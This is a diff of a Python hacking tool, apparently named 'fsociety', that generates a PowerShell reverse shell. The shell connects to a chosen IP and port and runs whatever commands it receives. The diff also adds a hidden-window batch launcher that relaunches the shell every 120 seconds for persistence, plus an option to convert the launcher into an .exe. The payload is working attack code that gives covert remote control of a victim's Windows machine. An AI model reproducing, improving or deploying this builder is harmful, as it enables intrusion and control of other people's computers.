@@ -313,7 +313,6 @@ Administrateur'''
             print('checking update !')
             with open('version.txt', 'r') as f:
                 version = f.read()
-                print(version)
                 version = int(version)
                 print(version)
             response = requests.get(f"https://raw.githubusercontent.com/benji77430/fsociety/main/version.txt")
@@ -665,7 +664,10 @@ Administrateur'''
                 print(ip)
                 nom = nom+".ps1"
                 starter = f"""@echo off
+:a
 PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""{nom}""' -WindowStyle Hidden"
+timeout /t 120
+goto a
         """
                 code = """Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('"""f'{ip}'"""',"""f'{port}'"""));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + "PS " + (pwd).Path + "> ");Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
                 import base64
@@ -677,6 +679,11 @@ PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 
                     with open(f'C:/Users/{getpass.getuser()}/desktop/starter.bat', "w") as f:
                         f.write(starter)
                         print('starter créer avec succès')
+                    choice = input('do you want to open bat to exe (y/N) ? ')
+                    if choice in ('Y', 'y', 'yes', 'YES'):
+                        os.startfile('batoexe.exe')
+                    print('process finished')
+                    time.sleep(1)
                 except Exception as e:
                     try:
                         with open(f"/home{getpass.getuser()}/desktop/{nom}","w") as f:
